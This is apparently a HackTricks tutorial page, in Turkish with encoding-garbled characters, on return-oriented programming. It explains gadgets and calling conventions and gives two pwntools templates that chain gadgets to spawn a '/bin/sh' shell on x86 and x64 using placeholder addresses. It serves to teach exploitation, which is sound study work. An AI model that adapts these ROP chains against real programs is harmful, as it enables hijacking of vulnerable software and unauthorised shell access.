# ROP - Return Oriented Programing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi gÃ¼venlik Ã¶nlemlerini aÅŸmak iÃ§in kullanÄ±lan ileri dÃ¼zey bir istismar tekniÄŸidir. Bir saldÄ±rgan, shellcode enjekte etmek ve Ã§alÄ±ÅŸtÄ±rmak yerine, ikili dosyada veya yÃ¼klenmiÅŸ kÃ¼tÃ¼phanelerde zaten mevcut olan kod parÃ§alarÄ±nÄ±, yani **"gadgets"** kullanÄ±r. Her gadget genellikle bir `ret` talimatÄ± ile biter ve veri taÅŸÄ±mak veya aritmetik iÅŸlemler yapmak gibi kÃ¼Ã§Ã¼k bir iÅŸlem gerÃ§ekleÅŸtirir. Bu gadget'larÄ± bir araya getirerek, bir saldÄ±rgan, NX/DEP korumalarÄ±nÄ± etkili bir ÅŸekilde aÅŸarak keyfi iÅŸlemler gerÃ§ekleÅŸtiren bir yÃ¼k oluÅŸturabilir.

### ROP NasÄ±l Ã‡alÄ±ÅŸÄ±r

1. **Kontrol AkÄ±ÅŸÄ±nÄ± Ele GeÃ§irme**: Ä°lk olarak, bir saldÄ±rgan, genellikle bir tampon taÅŸmasÄ± istismarÄ± ile yÄ±ÄŸÄ±n Ã¼zerindeki kaydedilmiÅŸ dÃ¶nÃ¼ÅŸ adresini geÃ§ersiz kÄ±lmak suretiyle bir programÄ±n kontrol akÄ±ÅŸÄ±nÄ± ele geÃ§irmelidir.
2. **Gadget Zincirleme**: SaldÄ±rgan daha sonra istenen eylemleri gerÃ§ekleÅŸtirmek iÃ§in gadget'larÄ± dikkatlice seÃ§er ve zincirler. Bu, bir fonksiyon Ã§aÄŸrÄ±sÄ± iÃ§in argÃ¼manlarÄ± ayarlamayÄ±, fonksiyonu Ã§aÄŸÄ±rmayÄ± (Ã¶rneÄŸin, `system("/bin/sh")`) ve gerekli temizlik veya ek iÅŸlemleri yÃ¶netmeyi iÃ§erebilir.
3. **YÃ¼kÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±**: ZayÄ±f fonksiyon dÃ¶ndÃ¼ÄŸÃ¼nde, meÅŸru bir konuma dÃ¶nmek yerine, gadget zincirini Ã§alÄ±ÅŸtÄ±rmaya baÅŸlar.

### AraÃ§lar

Genellikle, gadget'lar **[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)**, **[ropper](https://github.com/sashs/Ropper)** veya doÄŸrudan **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)) kullanÄ±larak bulunabilir.

## x86 Ã–rneÄŸinde ROP Zinciri

### **x86 (32-bit) Ã‡aÄŸrÄ± KonvansiyonlarÄ±**

* **cdecl**: Ã‡aÄŸrÄ±yÄ± yapan yÄ±ÄŸÄ±nÄ± temizler. Fonksiyon argÃ¼manlarÄ± yÄ±ÄŸÄ±na ters sÄ±rayla (saÄŸdan sola) itilir. **ArgÃ¼manlar yÄ±ÄŸÄ±na saÄŸdan sola itilir.**
* **stdcall**: cdecl'e benzer, ancak Ã§aÄŸrÄ±lan fonksiyon yÄ±ÄŸÄ±nÄ± temizlemekten sorumludur.

### **Gadget Bulma**

Ã–ncelikle, ikili dosya veya yÃ¼klenmiÅŸ kÃ¼tÃ¼phaneler iÃ§inde gerekli gadget'larÄ± tanÄ±mladÄ±ÄŸÄ±mÄ±zÄ± varsayalÄ±m. Ä°lgilendiÄŸimiz gadget'lar ÅŸunlardÄ±r:

* `pop eax; ret`: Bu gadget, yÄ±ÄŸÄ±nÄ±n en Ã¼stÃ¼ndeki deÄŸeri `EAX` kaydedicisine alÄ±r ve ardÄ±ndan dÃ¶ner, bÃ¶ylece `EAX`'i kontrol etmemizi saÄŸlar.
* `pop ebx; ret`: YukarÄ±daki gibi, ancak `EBX` kaydedicisi iÃ§in, `EBX` Ã¼zerinde kontrol saÄŸlar.
* `mov [ebx], eax; ret`: `EAX`'deki deÄŸeri `EBX` tarafÄ±ndan iÅŸaret edilen bellek konumuna taÅŸÄ±r ve ardÄ±ndan dÃ¶ner. Bu genellikle **write-what-where gadget** olarak adlandÄ±rÄ±lÄ±r.
* AyrÄ±ca, `system()` fonksiyonunun adresine de sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, `system('/bin/sh')`'yi Ã§alÄ±ÅŸtÄ±rmayÄ± hedefleyerek ROP zinciri yÃ¼rÃ¼tmesi iÃ§in yÄ±ÄŸÄ±nÄ± aÅŸaÄŸÄ±daki gibi hazÄ±rlarÄ±z, zincirin nasÄ±l baÅŸladÄ±ÄŸÄ±na dikkat edin:

1. Hizalama amaÃ§lÄ± bir `ret` talimatÄ± (isteÄŸe baÄŸlÄ±)
2. `system` fonksiyonunun adresi (ASLR'nin devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ±nÄ± ve libc'nin bilindiÄŸini varsayarak, daha fazla bilgi iÃ§in [**Ret2lib**](ret2lib/))
3. `system()`'den dÃ¶nÃ¼ÅŸ adresi iÃ§in yer tutucu
4. `"/bin/sh"` dizesinin adresi (system fonksiyonu iÃ§in parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Zinciri x64 Ã–rneÄŸi

### **x64 (64-bit) Ã‡aÄŸrÄ± KonvansiyonlarÄ±**

* **Unix benzeri sistemlerde** **System V AMD64 ABI** Ã§aÄŸrÄ± konvansiyonu kullanÄ±lÄ±r; burada **ilk altÄ± tamsayÄ± veya iÅŸaretÃ§i argÃ¼manÄ± `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9`** kayÄ±tlarÄ±nda iletilir. Ek argÃ¼manlar yÄ±ÄŸÄ±nda iletilir. DÃ¶nÃ¼ÅŸ deÄŸeri `RAX`'a yerleÅŸtirilir.
* **Windows x64** Ã§aÄŸrÄ± konvansiyonu, ilk dÃ¶rt tamsayÄ± veya iÅŸaretÃ§i argÃ¼manÄ± iÃ§in `RCX`, `RDX`, `R8` ve `R9` kullanÄ±r; ek argÃ¼manlar yÄ±ÄŸÄ±nda iletilir. DÃ¶nÃ¼ÅŸ deÄŸeri `RAX`'a yerleÅŸtirilir.
* **KayÄ±tlar**: 64-bit kayÄ±tlar `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8`'den `R15`'e kadar iÃ§erir.

#### **Gadget Bulma**

AmacÄ±mÄ±z iÃ§in, **RDI** kaydÄ±nÄ± ayarlamamÄ±za ( **"/bin/sh"** dizesini **system()** fonksiyonuna argÃ¼man olarak iletmek iÃ§in) ve ardÄ±ndan **system()** fonksiyonunu Ã§aÄŸÄ±rmamÄ±za olanak tanÄ±yacak gadget'lara odaklanalÄ±m. AÅŸaÄŸÄ±daki gadget'larÄ± belirlediÄŸimizi varsayÄ±yoruz:

* **pop rdi; ret**: YÄ±ÄŸÄ±nÄ±n en Ã¼stÃ¼ndeki deÄŸeri **RDI**'ye alÄ±r ve ardÄ±ndan dÃ¶ner. **system()** iÃ§in argÃ¼manÄ±mÄ±zÄ± ayarlamak iÃ§in gereklidir.
* **ret**: Basit bir dÃ¶nÃ¼ÅŸ, bazÄ± senaryolarda yÄ±ÄŸÄ±n hizalamasÄ± iÃ§in faydalÄ±dÄ±r.

Ve **system()** fonksiyonunun adresini bildiÄŸimizi biliyoruz.

### **ROP Zinciri**

AÅŸaÄŸÄ±da, **pwntools** kullanarak **x64** Ã¼zerinde **system('/bin/sh')** Ã§alÄ±ÅŸtÄ±rmayÄ± hedefleyen bir ROP zinciri kurma ve yÃ¼rÃ¼tme Ã¶rneÄŸi bulunmaktadÄ±r:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
In this example:

* **`RDI`**'yi **`"/bin/sh"`** adresine ayarlamak iÃ§in **`pop rdi; ret`** gadget'Ä±nÄ± kullanÄ±yoruz.
* **`RDI`**'yi ayarladÄ±ktan sonra, zincirde **system()**'Ä±n adresi ile doÄŸrudan **`system()`**'e atlÄ±yoruz.
* Hedef ortamÄ±n gerektirmesi durumunda hizalama iÃ§in **`ret_gadget`** kullanÄ±lÄ±r; bu, iÅŸlevleri Ã§aÄŸÄ±rmadan Ã¶nce doÄŸru yÄ±ÄŸÄ±n hizalamasÄ±nÄ± saÄŸlamak iÃ§in **x64**'te daha yaygÄ±ndÄ±r.

### YÄ±ÄŸÄ±n HizalamasÄ±

**x86-64 ABI** bir **call instruction** yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼nde **yÄ±ÄŸÄ±nÄ±n 16-byte hizalÄ±** olmasÄ±nÄ± garanti eder. **LIBC**, performansÄ± optimize etmek iÃ§in **SSE instructions** (Ã¶rneÄŸin **movaps**) kullanÄ±r ve bu hizalamayÄ± gerektirir. YÄ±ÄŸÄ±n dÃ¼zgÃ¼n hizalanmamÄ±ÅŸsa (yani **RSP** 16'nÄ±n katÄ± deÄŸilse), **ROP chain** iÃ§inde **system** gibi iÅŸlevlere yapÄ±lan Ã§aÄŸrÄ±lar baÅŸarÄ±sÄ±z olur. Bunu dÃ¼zeltmek iÃ§in, **system**'i Ã§aÄŸÄ±rmadan Ã¶nce ROP zincirinizde basitÃ§e bir **ret gadget** ekleyin.

## x86 vs x64 ana fark

{% hint style="success" %}
x64, ilk birkaÃ§ argÃ¼man iÃ§in register'lar kullandÄ±ÄŸÄ±ndan, genellikle basit iÅŸlev Ã§aÄŸrÄ±larÄ± iÃ§in x86'dan daha az gadget gerektirir, ancak doÄŸru gadget'larÄ± bulmak ve zincirlemek, register sayÄ±sÄ±nÄ±n artmasÄ± ve daha bÃ¼yÃ¼k adres alanÄ± nedeniyle daha karmaÅŸÄ±k olabilir. **x64** mimarisindeki artan register sayÄ±sÄ± ve daha bÃ¼yÃ¼k adres alanÄ±, Ã¶zellikle Return-Oriented Programming (ROP) baÄŸlamÄ±nda exploit geliÅŸtirme iÃ§in hem fÄ±rsatlar hem de zorluklar sunar.
{% endhint %}

## Koruma Ã–nlemleri

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/)
* [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/)

## DiÄŸer Ã–rnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)

## ROP tabanlÄ± teknikler

ROP'un, keyfi kodu yÃ¼rÃ¼tmek iÃ§in sadece bir teknik olduÄŸunu unutmayÄ±n. ROP'a dayalÄ± olarak birÃ§ok Ret2XXX tekniÄŸi geliÅŸtirilmiÅŸtir:

* **Ret2lib**: Keyfi parametrelerle yÃ¼klÃ¼ bir kÃ¼tÃ¼phaneden keyfi iÅŸlevleri Ã§aÄŸÄ±rmak iÃ§in ROP kullanÄ±n (genellikle `system('/bin/sh')` gibi bir ÅŸey).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP kullanarak bir syscall'a, Ã¶rneÄŸin `execve`, Ã§aÄŸrÄ± hazÄ±rlayÄ±n ve keyfi komutlarÄ± yÃ¼rÃ¼tÃ¼n.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Ä°lki akÄ±ÅŸÄ± kontrol etmek iÃ§in EIP yerine EBP'yi kÃ¶tÃ¼ye kullanacak ve ikincisi Ret2lib'e benzer, ancak bu durumda akÄ±ÅŸ esas olarak EBP adresleri ile kontrol edilir (EIP'yi kontrol etmek de gereklidir).

{% content-ref url="stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter**'da **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
